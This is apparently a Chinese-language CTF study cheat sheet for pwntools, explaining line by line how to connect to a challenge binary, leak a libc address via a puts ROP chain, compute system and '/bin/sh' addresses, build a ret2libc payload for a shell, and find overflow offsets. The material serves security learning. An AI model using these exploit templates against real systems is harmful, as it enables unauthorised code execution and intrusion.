---
title: "offset = 72"
lastmod: 2026-05-10T22:25:49+08:00
draft: false
---
## 基础模板一行行对照

|代码|作用|
|---|---|
|from pwn import *|导入 pwntools 全部常用功能|
|context(os="linux", arch="amd64", log_level="debug")|设置目标系统、架构、日志等级|
|e = ELF("./attachment")|解析程序 ELF，方便拿符号表、GOT、PLT|
|libc = ELF("./libc.so.6")|解析题目附带的 libc|
|io = process("./attachment")|本地运行程序|
|io = remote("ip", 9999)|连接远程服务|
|io = gdb.debug("./attachment", "b *main\nc")|启动并附加 GDB 调试|
|offset = 72|栈溢出覆盖返回地址的偏移|
|io.interactive()|切换到交互模式，常用于拿 shell 后操作|

---

## 收发数据一行行对照

| 代码                                 | 作用                 |
| ---------------------------------- | ------------------ |
| io.send(b"aaaa")                   | 发送字节，不自动加换行        |
| io.sendline(b"aaaa")               | 发送字节，并自动加换行        |
| io.sendafter(b"Name:", b"aaaa")    | 收到 Name: 后发送数据     |
| io.sendlineafter(b"Choice:", b"1") | 收到 Choice: 后发送一行   |
| io.recv()                          | 接收一些数据             |
| io.recv(4)                         | 接收 4 字节            |
| io.recvline()                      | 接收一整行              |
| io.recvuntil(b"Index:")            | 一直接收到 Index: 为止    |
| data = io.recvuntil(b"\x7f")       | 常用于接收泄露出来的 libc 地址 |
io.interactive()
自定义输入

---

## 你给的示例对照版

`from pwn import * # 导入 pwntools context(os="linux", arch="amd64", log_level="debug") # 设置环境：Linux / 64位 / debug日志 e = ELF("./attachment") # 解析题目程序 io = process("./attachment") # 本地启动程序 # io = remote("ip", 9999) # 如果打远程就改成这个 offset = 72 # 溢出偏移，需要根据题目实际计算 io.sendline(b'2') # 发送菜单选项 2 io.recvuntil(b"Index:") # 等待程序输出 Index: io.sendline(b'0') # 发送下标 0`

---

## 打包与解包一行行对照

| 代码                                | 作用                     |
| --------------------------------- | ---------------------- |
| p8(0x41)                          | 打包 1 字节整数              |
| p16(0x1234)                       | 打包 2 字节整数              |
| p32(0xdeadbeef)                   | 打包 4 字节整数              |
| p64(0xdeadbeef)                   | 打包 8 字节整数              |
| u32(data)                         | 将 4 字节数据解包成整数          |
| u64(data)                         | 将 8 字节数据解包成整数          |
| u64(io.recv(6).ljust(8, b"\x00")) | 把收到的 6 字节地址补齐成 8 字节后解包 |

---

## 常见地址获取一行行对照

| 代码                         | 作用                 |
| -------------------------- | ------------------ |
| e.symbols["main"]          | 获取 main 地址(全局变量)   |
| e.symbols["puts"]          | 获取符号 puts 地址       |
| e.got["puts"]              | 获取 puts@got 地址     |
| e.plt["puts"]              | 获取 puts@plt 地址     |
| next(e.search(b"/bin/sh")) | 查找程序中的 /bin/sh 字符串 |
| hex(e.symbols["win"])      | 以十六进制显示 win 函数地址   |

---

## ROP 常用一行行对照

|代码|作用|
|---|---|
|rop = ROP(e)|基于 ELF 自动找 gadget|
|pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]|找 pop rdi ; ret|
|ret = rop.find_gadget(["ret"])[0]|找单独的 ret，常用于栈对齐|
|payload = flat(b"A"*offset, pop_rdi, e.got["puts"], e.plt["puts"], e.symbols["main"])|构造泄露 puts 的 ROP 链|

---

## libc 计算一行行对照

|代码|作用|
|---|---|
|puts_addr = u64(io.recvuntil(b"\x7f")[-6:].ljust(8, b"\x00"))|从输出中取出泄露的 puts 地址|
|libc_base = puts_addr - libc.sym["puts"]|计算 libc 基址|
|system_addr = libc_base + libc.sym["system"]|计算 system 地址|
|binsh_addr = libc_base + next(libc.search(b"/bin/sh"))|计算 /bin/sh 地址|

---

## 构造 payload 一行行对照

|代码|作用|
|---|---|
|payload = b"A" * offset|先填满溢出长度|
|payload += p64(ret)|栈对齐|
|payload += p64(pop_rdi)|控制 rdi|
|payload += p64(binsh_addr)|给 system("/bin/sh") 传参|
|payload += p64(system_addr)|调用 system|

---

## 偏移计算一行行对照

|代码|作用|
|---|---|
|payload = cyclic(200)|生成模式串，方便定位偏移|
|offset = cyclic_find(0x6161616c)|根据崩溃值反查偏移|
|offset = cyclic_find(b"laaa")|某些场景直接按字节串查偏移|

---

## 菜单题模板一行行对照

```python
def add(size, data):                             # 新建块
    io.sendlineafter(b"Choice:", b"1")          # 选择菜单 1
    io.sendlineafter(b"Size:", str(size).encode())  # 发送大小
    io.sendafter(b"Data:", data)                # 发送内容

def edit(idx, data):                            # 编辑块
    io.sendlineafter(b"Choice:", b"2")
    io.sendlineafter(b"Index:", str(idx).encode())
    io.sendafter(b"Data:", data)

def delete(idx):                                # 删除块
    io.sendlineafter(b"Choice:", b"3")
    io.sendlineafter(b"Index:", str(idx).encode())

def show(idx):                                  # 查看块
    io.sendlineafter(b"Choice:", b"4")
    io.sendlineafter(b"Index:", str(idx).encode())

```

---

## 调试常用一行行对照

|代码|作用|
|---|---|
|context.terminal = ["tmux", "splitw", "-h"]|用 tmux 分屏打开调试窗口|
|gdb.attach(io)|给当前进程附加 GDB|
|gdb.attach(io, "b *main\nc")|附加 GDB 并下断点|
|pause()|程序暂停，方便手动附加调试|

---

## 日志输出一行行对照

|代码|作用|
|---|---|
|success(hex(libc_base))|输出成功信息|
|info(hex(puts_addr))|输出普通信息|
|warn("check stack")|输出警告信息|

---

## 最常用最小模板

```
from pwn import *

context(os="linux", arch="amd64", log_level="debug")
context.terminal = ["tmux", "splitw", "-h"]

e = ELF("./attachment")
libc = ELF("./libc.so.6")

def start():
    if args.REMOTE:
        return remote("ip", 9999)
    elif args.GDB:
        return gdb.debug("./attachment", "b *main\nc")
    else:
        return process("./attachment")

io = start()

# offset = 72
# rop = ROP(e)
# pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

io.interactive()

```
